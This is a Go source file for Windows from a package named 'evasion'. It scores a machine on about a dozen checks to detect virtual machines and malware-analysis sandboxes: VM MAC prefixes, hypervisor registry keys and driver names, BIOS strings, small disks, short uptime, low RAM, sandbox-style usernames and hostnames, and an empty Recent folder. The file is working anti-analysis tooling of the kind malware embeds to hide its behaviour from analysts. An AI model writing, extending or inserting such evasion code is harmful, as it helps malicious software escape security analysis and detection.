//go:build windows

package evasion

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

func SandboxDetected() bool {
	score := 0

	// -- High-confidence
	if vmMacAddress() {
		score += 3
	}
	if vmRegistryArtifacts() {
		score += 3
	}
	if vmDriverArtifacts() {
		score += 3
	}
	if vmSystemBiosVersion() {
		score += 3
	}
	if lowDiskSize() {
		score += 3
	}

	// -- Heuristics
	if uptimeTooShort() {
		score++
	}
	if physicalMemoryTooSmall() {
		score++
	}
	if cpuCountTooLow() {
		score++
	}
	if tempFileCountTooLow() {
		score++
	}
	if suspiciousUsername() {
		score++
	}
	if suspiciousHostname() {
		score++
	}
	if lowScreenResolution() {
		score++
	}
	if recentDocsEmpty() {
		score++
	}

	return score >= 4
}

func vmMacAddress() bool {
	prefixes := []string{
		"00:05:69", "00:0c:29", "00:1c:14", "00:50:56", // VMware
		"08:00:27",                                     // VirtualBox
		"00:15:5d",                                     // Hyper-V
		"52:54:00",                                     // QEMU/KVM
		"00:16:3e",                                     // Xen
		"00:1c:42",                                     // Parallels
		"02:42",                                        // Docker bridge
	}

	kernel := syscall.NewLazyDLL("iphlpapi.dll")
	getAdaptersInfo := kernel.NewProc("GetAdaptersInfo")

	var bufSize uint32 = 16 * 1024
	buf := make([]byte, bufSize)
	ret, _, _ := getAdaptersInfo.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufSize)),
	)
	if ret != 0 && ret != 111 { // 111 = ERROR_BUFFER_OVERFLOW
		return false
	}

	haystack := strings.ToLower(string(buf))
	for _, p := range prefixes {
		if strings.Contains(haystack, p) {
			return true
		}
	}
	return false
}

func vmRegistryArtifacts() bool {
	keys := []string{
		`SOFTWARE\VMware, Inc.\VMware Tools`,
		`SOFTWARE\Oracle\VirtualBox Guest Additions`,
		`SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`,
		`SOFTWARE\Parallels\Parallels Tools`,
		`SOFTWARE\Xensource\XenTools`,
		`SOFTWARE\Red Hat\QXL-WDDM-DOD`,
	}
	advapi := syscall.NewLazyDLL("advapi32.dll")
	regOpen := advapi.NewProc("RegOpenKeyExW")
	regClose := advapi.NewProc("RegCloseKey")

	const hiveLocalMachine = 0x80000002
	const keyRead = 0x20019

	for _, k := range keys {
		pathUTF16, err := syscall.UTF16PtrFromString(k)
		if err != nil {
			continue
		}
		var h uintptr
		ret, _, _ := regOpen.Call(
			hiveLocalMachine,
			uintptr(unsafe.Pointer(pathUTF16)),
			0, keyRead,
			uintptr(unsafe.Pointer(&h)),
		)
		if ret == 0 && h != 0 {
			regClose.Call(h)
			return true
		}
	}
	return false
}

func vmDriverArtifacts() bool {
	base := `SYSTEM\CurrentControlSet\Enum\SCSI`
	advapi := syscall.NewLazyDLL("advapi32.dll")
	regOpen := advapi.NewProc("RegOpenKeyExW")
	regEnumKey := advapi.NewProc("RegEnumKeyExW")
	regClose := advapi.NewProc("RegCloseKey")

	const hiveLocalMachine = 0x80000002
	const keyRead = 0x20019

	basePtr, err := syscall.UTF16PtrFromString(base)
	if err != nil {
		return false
	}
	var h uintptr
	ret, _, _ := regOpen.Call(
		hiveLocalMachine,
		uintptr(unsafe.Pointer(basePtr)),
		0, keyRead,
		uintptr(unsafe.Pointer(&h)),
	)
	if ret != 0 || h == 0 {
		return false
	}
	defer regClose.Call(h)

	needles := []string{
		"vmware", "vbox", "virtualbox", "qemu", "xen",
		"parallels", "virtio", "hyper-v", "msft virtual",
	}

	var idx uint32
	for {
		nameBuf := make([]uint16, 256)
		nameLen := uint32(len(nameBuf))
		r, _, _ := regEnumKey.Call(
			h, uintptr(idx),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
			0, 0, 0, 0,
		)
		if r != 0 {
			break
		}
		name := strings.ToLower(syscall.UTF16ToString(nameBuf))
		for _, n := range needles {
			if strings.Contains(name, n) {
				return true
			}
		}
		idx++
	}
	return false
}

func vmSystemBiosVersion() bool {
	key := `HARDWARE\DESCRIPTION\System\BIOS`
	advapi := syscall.NewLazyDLL("advapi32.dll")
	regOpen := advapi.NewProc("RegOpenKeyExW")
	regQuery := advapi.NewProc("RegQueryValueExW")
	regClose := advapi.NewProc("RegCloseKey")

	const hiveLocalMachine = 0x80000002
	const keyRead = 0x20019

	keyPtr, err := syscall.UTF16PtrFromString(key)
	if err != nil {
		return false
	}
	var h uintptr
	ret, _, _ := regOpen.Call(
		hiveLocalMachine,
		uintptr(unsafe.Pointer(keyPtr)),
		0, keyRead,
		uintptr(unsafe.Pointer(&h)),
	)
	if ret != 0 || h == 0 {
		return false
	}
	defer regClose.Call(h)

	values := []string{
		"SystemManufacturer", "SystemProductName",
		"BIOSVendor", "BIOSVersion",
	}
	needles := []string{
		"vmware", "virtualbox", "innotek", "qemu", "xen",
		"parallels", "microsoft corporation virtual",
		"bochs", "seabios",
	}

	for _, v := range values {
		vPtr, err := syscall.UTF16PtrFromString(v)
		if err != nil {
			continue
		}
		var dataType, dataLen uint32
		dataBuf := make([]uint16, 512)
		dataLen = uint32(len(dataBuf) * 2)
		r, _, _ := regQuery.Call(
			h,
			uintptr(unsafe.Pointer(vPtr)),
			0,
			uintptr(unsafe.Pointer(&dataType)),
			uintptr(unsafe.Pointer(&dataBuf[0])),
			uintptr(unsafe.Pointer(&dataLen)),
		)
		if r != 0 {
			continue
		}
		val := strings.ToLower(syscall.UTF16ToString(dataBuf))
		for _, n := range needles {
			if strings.Contains(val, n) {
				return true
			}
		}
	}
	return false
}

func lowDiskSize() bool {
	kernel := syscall.NewLazyDLL("kernel32.dll")
	getDriveType := kernel.NewProc("GetDriveTypeW")
	getDiskFreeSpaceEx := kernel.NewProc("GetDiskFreeSpaceExW")

	sysDrive := os.Getenv("SystemDrive")
	if sysDrive == "" {
		sysDrive = "C:"
	}
	root := sysDrive + `\`

	rootPtr, err := syscall.UTF16PtrFromString(root)
	if err != nil {
		return false
	}
	// DRIVE_FIXED = 3
	dt, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(rootPtr)))
	if dt != 3 {
		return false
	}

	var freeToCaller, total, totalFree uint64
	ret, _, _ := getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(rootPtr)),
		uintptr(unsafe.Pointer(&freeToCaller)),
		uintptr(unsafe.Pointer(&total)),
		uintptr(unsafe.Pointer(&totalFree)),
	)
	if ret == 0 || total == 0 {
		return false
	}
	totalGB := total / (1024 * 1024 * 1024)
	return totalGB > 0 && totalGB < 60
}

func uptimeTooShort() bool {
	kernel := syscall.NewLazyDLL("kernel32.dll")
	getTickCount := kernel.NewProc("GetTickCount64")
	r, _, _ := getTickCount.Call()
	if r == 0 {
		return false
	}
	uptime := time.Duration(r) * time.Millisecond
	return uptime < 90*time.Second
}

func physicalMemoryTooSmall() bool {
	kernel := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel.NewProc("GetPhysicallyInstalledSystemMemory")
	var memKB uint64
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memKB)))
	if ret == 0 {
		return false
	}
	memGB := memKB / 1048576
	return memGB < 2
}

func cpuCountTooLow() bool { return runtime.NumCPU() < 2 }

func tempFileCountTooLow() bool {
	temp := os.Getenv("TEMP")
	if temp == "" {
		temp = os.TempDir()
	}
	count := 0
	rootDepth := strings.Count(filepath.Clean(temp), string(os.PathSeparator))
	_ = filepath.Walk(temp, func(_ string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		depth := strings.Count(filepath.Clean(fi.Name()), string(os.PathSeparator))
		_ = depth
		if !fi.IsDir() {
			count++
			if count >= 5 {
				return filepath.SkipDir
			}
		}
		return nil
	})
	_ = rootDepth
	return count < 5
}

func suspiciousUsername() bool {
	u := strings.ToLower(os.Getenv("USERNAME"))
	if u == "" {
		return false
	}
	for _, n := range []string{
		"sandbox", "malware", "virus", "sample",
		"analyst", "cuckoo", "vmuser", "user", "test",
	} {
		if u == n || strings.HasPrefix(u, n+"_") {
			return true
		}
	}
	return false
}

func suspiciousHostname() bool {
	h, err := os.Hostname()
	if err != nil {
		return false
	}
	l := strings.ToLower(h)
	for _, n := range []string{
		"sandbox", "malware", "cuckoo", "analysis",
		"win-", "desktop-", "user-pc",
	} {
		if strings.Contains(l, n) {
			return true
		}
	}
	return false
}

func lowScreenResolution() bool {
	user32 := syscall.NewLazyDLL("user32.dll")
	getSystemMetrics := user32.NewProc("GetSystemMetrics")
	// SM_CXSCREEN = 0, SM_CYSCREEN = 1
	w, _, _ := getSystemMetrics.Call(0)
	h, _, _ := getSystemMetrics.Call(1)
	if w == 0 || h == 0 {
		return false
	}
	return w < 1024 || h < 768
}

func recentDocsEmpty() bool {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return false
	}
	dir := filepath.Join(appData, "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return false
	}
	return len(entries) == 0
}